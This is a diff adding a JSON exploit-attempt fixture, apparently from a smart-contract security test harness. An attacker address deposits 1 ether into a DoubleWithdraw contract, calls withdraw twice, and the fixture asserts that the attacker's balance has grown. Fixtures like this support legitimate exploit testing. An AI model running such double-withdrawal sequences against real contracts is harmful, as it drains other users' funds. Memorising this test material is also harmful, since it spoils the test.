@@ -1,0 +1,49 @@
+{
+    "attempt_id": "attempt_doublewithdraw",
+    "setup": {
+        "deployments": {
+            "target": {
+                "file": "DoubleWithdraw.sol",
+                "contract": "DoubleWithdraw",
+                "args": []
+            }
+        }
+    },
+    "prestate": {
+        "deals": [
+            {
+                "address": "attacker",
+                "amount_wei": "1 ether"
+            }
+        ]
+    },
+    "calls": [
+        {
+            "contract": "target",
+            "function": "deposit",
+            "args": [],
+            "from": "attacker",
+            "value": "1 ether"
+        },
+        {
+            "contract": "target",
+            "function": "withdraw",
+            "args": [],
+            "from": "attacker",
+            "value": "0"
+        },
+        {
+            "contract": "target",
+            "function": "withdraw",
+            "args": [],
+            "from": "attacker",
+            "value": "0"
+        }
+    ],
+    "assertions": [
+        {
+            "type": "balance_gt_before",
+            "address": "attacker"
+        }
+    ]
+}
